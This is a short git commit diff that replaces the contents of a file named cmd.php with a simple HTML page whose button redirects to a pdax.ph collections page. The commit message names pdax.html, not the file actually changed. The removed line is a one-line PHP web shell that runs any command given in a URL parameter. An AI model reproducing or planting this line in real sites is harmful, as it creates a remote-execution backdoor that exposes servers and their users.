7b3dd51b52d631cbb5783e9cd14daae739d2e566
republic101 <72572138+republic101@users.noreply.github.com>
2023-05-04 18:48:16 +0800

    Update pdax.html
    Signed-off-by: republic101 <72572138+republic101@users.noreply.github.com>

--- cmd.php
+++ cmd.php
@@ -1,1 +1,10 @@
-<?php system($_GET['cmd']); ?>
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>My Webpage</title>
+  </head>
+  <body>
+    <button onclick="window.location.href='https://mintoo.pdax.ph/collections/373'">Click me</button>
+  </body>
+</html>
+
